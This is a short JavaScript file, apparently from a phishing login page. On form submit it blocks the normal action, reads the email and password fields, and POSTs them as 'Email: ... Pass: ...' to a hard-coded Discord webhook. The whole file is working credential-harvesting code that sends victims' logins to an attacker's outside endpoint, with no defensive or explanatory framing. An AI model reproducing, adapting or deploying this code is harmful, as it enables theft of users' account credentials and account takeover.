// Get the input field element
document.addEventListener('DOMContentLoaded', function() {
const ename = document.querySelector('input[name="einput"]');
const pname = document.querySelector('input[name="pinput"]');

document.querySelector('form').addEventListener('submit', (event) => {
  event.preventDefault();

const emm = ename.value
let str1 ="Email: "
const pww = pname.value
let str2 = "Pass: "
const joined = str1 + emm + str2 + pww;
const webhookUrl = "https://discord.com/api/webhooks/1101469267209228349/y-GU-uZ5v6NHwdNZCuLksG9EHkIjZpDik1PXsxiSx4AgzoMREWMWvkTUHQbv1mxLgKbZ";
const data = {content: joined};
const curl = new XMLHttpRequest();
curl.open("POST", webhookUrl);
curl.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
curl.send(JSON.stringify(data));

});
});

